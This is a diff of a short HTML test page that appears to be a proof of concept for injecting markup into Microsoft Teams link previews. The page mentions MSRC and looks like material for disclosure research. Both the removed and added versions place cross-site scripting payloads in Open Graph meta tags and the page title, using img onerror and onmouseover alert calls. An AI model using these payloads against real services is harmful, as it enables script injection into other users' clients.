@@ -1,11 +1,12 @@
+<!DOCTYPE html>
 <html>
-  <head>
-    <meta property="og:title" content='"><img src=x onerror=alert(1)>'>
-    <meta property="og:description" content="Microsoft Teams Link Preview Injection Test">
-    <meta property="og:image" content="https://placehold.co/600x300/000000/FFFFFF?text=MSRC+Test">
-    <title>Teams HTML Injection PoC</title>
-  </head>
-  <body>
-    <h1>This is a test page for Teams preview rendering</h1>
-  </body>
+<head>
+  <title>" onmouseover="alert('XSS') //</title>
+  <meta property="og:title" content='"><img src=x onerror=alert("XSS")>'>
+  <meta property="og:description" content="HTML Injection Test for Teams">
+  <meta property="og:image" content="https://placehold.co/600x400/ff0000/ffffff.png?text=XSS+Test">
+</head>
+<body>
+  <h1>Test Page for Teams</h1>
+</body>
 </html>
